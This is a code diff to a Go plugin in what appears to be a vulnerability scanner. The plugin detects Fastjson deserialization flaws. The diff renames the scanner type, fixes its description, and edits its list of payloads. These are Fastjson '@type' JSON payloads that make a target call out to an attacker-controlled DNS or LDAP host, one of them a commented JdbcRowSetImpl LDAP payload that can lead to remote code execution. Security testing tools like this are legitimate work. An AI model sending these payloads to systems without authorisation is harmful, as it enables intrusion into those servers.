@@ -11,15 +11,16 @@ import (
 var checkFastJsonPayloads map[string][]string
 
 func init() {
-	Common.AddBugScanListPerFile(FastjsonJScan{Common.PluginBase{Name: "Fa", Desc: "Log4j 命令执行漏洞", Type: "RCE", Level: 2, TimeOut: 3, Ltype: "JAVA"}})
+	Common.AddBugScanListPerFile(FastjsonScan{Common.PluginBase{Name: "FastjsonScan", Desc: "Fastjson 反序列化漏洞", Type: "RCE", Level: 2, TimeOut: 3, Ltype: "JAVA"}})
 	checkFastJsonPayloads = map[string][]string{
 		"dig": []string{
-			"{\"@type\":\"java.net.InetAddress\",\"val\":\"%s.%s\"}",
+			//"{\"@type\":\"java.net.InetAddress\",\"val\":\"%s.%s\"}",
 			"{\"@type\":\"java.net.InetAddress\",\"val\":\"%s.%s\"}",
 			"{{\"@type\":\"java.net.URL\",\"val\":\"%s.%s\"}:\"aaa\"}",
-			"{{\"@type\":\"java.net.URL\",\"val\":\"%s.%s\"}:\"aaa\"}",
+			//"{{\"@type\":\"java.net.URL\",\"val\":\"%s.%s\"}:\"aaa\"}",
 			"{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"http://%s.%s\"}}\"\"}",
 			"{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"%s.%s\"}}",
+			"[{\"@type\":\"java.net.CookiePolicy\"},{\"@type\":\"java.net.Inet4Address\",\"val\":\"%s.%s\"}]",
 		},
 		"ldap": []string{
 			//"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://%s/%s\", \"autoCommit\":true}",
@@ -30,11 +31,11 @@ func init() {
 	}
 }
 
-type FastjsonJScan struct {
+type FastjsonScan struct {
 	Common.PluginBase
 }
 
-func (p FastjsonJScan) Exec(p1 Common.PluginBaseFun, request Common.Request, response Common.Response) {
+func (p FastjsonScan) Exec(p1 Common.PluginBaseFun, request Common.Request, response Common.Response) {
 	if !p.CheckReverse() {
 		return
 	}
@@ -44,7 +45,7 @@ func (p FastjsonJScan) Exec(p1 Common.PluginBaseFun, request Common.Request, res
 
 }
 
-func (p FastjsonJScan) CheckLog(checkList []Log4JChekcRsult, reverse *Common.Reverse) (Log4JChekcRsult, bool) {
+func (p FastjsonScan) CheckLog(checkList []Log4JChekcRsult, reverse *Common.Reverse) (Log4JChekcRsult, bool) {
 	if reverse.ReverseType == "ldap" {
 		for _, checkInfo := range checkList {
 			if checkInfo.CheckCount < 5 {
@@ -86,7 +87,7 @@ type FastJChekcRsult struct {
 	CheckCount int
 }
 
-func (p FastjsonJScan) Audit() {
+func (p FastjsonScan) Audit() {
 
 	checkLists := []Log4JChekcRsult{}
 
